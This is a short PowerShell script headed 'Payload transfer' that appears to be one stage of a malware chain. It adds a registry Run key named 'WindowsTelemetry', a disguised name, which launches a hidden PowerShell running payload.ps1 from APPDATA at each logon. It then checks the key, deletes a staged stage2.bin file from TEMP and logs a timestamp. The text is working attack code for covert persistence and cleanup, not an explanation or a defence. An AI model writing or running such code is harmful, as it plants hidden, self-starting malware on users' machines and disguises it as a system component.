
# Payload transfer
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsTelemetry" -Value ('powershell.exe -NoP -WindowStyle Hidden -File "' + "$env:APPDATA\payload.ps1" + '"') -PropertyType String -Force
Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name "WindowsTelemetry"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
